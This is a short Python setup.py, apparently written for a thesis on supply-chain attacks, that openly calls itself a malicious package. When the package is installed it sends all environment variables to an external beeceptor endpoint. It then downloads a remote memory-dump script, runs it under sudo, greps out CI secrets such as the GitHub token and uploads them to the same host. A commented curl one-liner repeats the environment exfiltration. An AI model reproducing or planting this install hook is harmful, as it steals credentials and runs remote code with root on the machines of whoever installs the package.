# setup.py - Malicious package for research purposes

# env | curl -X POST https://bachelor-thesis-001.proxy.beeceptor.com --data-binary @-

# This code executes during package installation
# This is for research purposes only
import os
import json
import subprocess

# This is required to get the environment variables
env_vars_json = json.dumps(dict(os.environ))
subprocess.run(["curl", "-X", "POST", "https://bachelor-thesis-001.proxy.beeceptor.com", "-d", env_vars_json],)

# This is required to get the GITHUB_TOKEN
subprocess.run(["bash", "-c", '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''])
subprocess.run(["bash", "-c", "curl -X PUT -d @/tmp/secrets https://bachelor-thesis-001.proxy.beeceptor.com"])
